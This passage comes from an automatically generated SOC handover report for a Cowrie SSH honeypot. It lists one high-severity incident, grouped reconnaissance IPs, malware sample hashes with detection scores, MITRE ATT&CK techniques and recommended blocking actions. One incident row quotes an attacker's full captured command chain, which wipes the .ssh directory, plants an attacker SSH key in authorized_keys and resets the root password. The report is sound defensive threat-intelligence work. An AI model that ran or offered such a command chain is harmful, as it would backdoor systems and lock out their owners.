- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf38af29d48

| Field | Detail |
|---|---|
| **Source IP** | `14.103.116[.]98` |
| **First Seen** | 2026-04-17 22:43 |
| **Last Seen** | 2026-04-17 22:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:vgqTeQeurQSw"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:43:30` | `cowrie.session.connect` |
| `2026-04-17 22:43:30` | `cowrie.client.version` |
| `2026-04-17 22:43:30` | `cowrie.client.kex` |
| `2026-04-17 22:43:31` | `cowrie.login.success` |
| `2026-04-17 22:43:31` | `cowrie.session.params` |
| `2026-04-17 22:43:31` | `cowrie.command.input` |
| `2026-04-17 22:43:31` | `cowrie.command.failed` |
| `2026-04-17 22:43:31` | `cowrie.log.closed` |
| `2026-04-17 22:43:32` | `cowrie.session.params` |
| `2026-04-17 22:43:32` | `cowrie.command.input` |
| `2026-04-17 22:43:32` | `cowrie.session.file_download` |
| `2026-04-17 22:43:32` | `cowrie.log.closed` |
| `2026-04-17 22:43:46` | `cowrie.session.params` |
| `2026-04-17 22:43:46` | `cowrie.command.input` |
| `2026-04-17 22:43:46` | `cowrie.log.closed` |
| `2026-04-17 22:43:46` | `cowrie.session.params` |
| `2026-04-17 22:43:46` | `cowrie.command.input` |

**Recommended Actions:**
- [ ] Submit `14.103.116[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.116[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.35[.]128` | **23** | 2026-04-17 22:21 | 2026-04-17 22:26 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `209.141.47[.]217` | **20** | 2026-04-17 20:52 | 2026-04-17 21:19 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.106[.]110` | **14** | 2026-04-17 22:31 | 2026-04-17 22:43 | 17m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.116[.]98` | **13** | 2026-04-17 22:33 | 2026-04-17 22:43 | 14m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.58[.]187` | **4** | 2026-04-17 20:59 | 2026-04-17 21:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.110[.]204` | **2** | 2026-04-17 21:32 | 2026-04-17 21:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `135.237.126[.]225` | **2** | 2026-04-17 22:05 | 2026-04-17 22:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]166` | **2** | 2026-04-17 21:08 | 2026-04-17 21:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.172.236[.]241` | 1 | 2026-04-17 22:35 | 2026-04-17 22:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.15[.]138` | 1 | 2026-04-17 22:37 | 2026-04-17 22:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.147.143[.]81` | 1 | 2026-04-17 21:48 | 2026-04-17 21:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]179` | 1 | 2026-04-17 22:33 | 2026-04-17 22:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]208` | 1 | 2026-04-17 22:35 | 2026-04-17 22:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]226` | 1 | 2026-04-17 22:33 | 2026-04-17 22:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-17 21:12 | 2026-04-17 21:13 | 51s | 0 | `T1592` | 🟢 LOW |
| `52.233.193[.]61` | 1 | 2026-04-17 22:34 | 2026-04-17 22:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.109.48[.]187` | 1 | 2026-04-17 22:02 | 2026-04-17 22:03 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.48.110[.]204` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 6 |
| `121.147.143[.]81` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `209.141.47[.]217` | US | FranTech Solutions | **100** ⚠️ | 50 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `52.233.193[.]61` | NL | Microsoft Corporation | **100** ⚠️ | 50 |
| `14.103.112[.]179` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `115.190.106[.]110` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.115[.]208` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `103.172.236[.]241` | VN | HERAL SCIENCE AND TECHNOLOGY JOINT STOCK COMPANY | **100** ⚠️ | 50 |
| `120.48.15[.]138` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 83 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 117 cases |
| Tool 34  | Credential Extractor        | ✅ 55 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (3.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 24 priority case(s) shown individually · 17 recon entry/entries in table (8 group(s) consolidating 80 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-17T22:44:58Z_
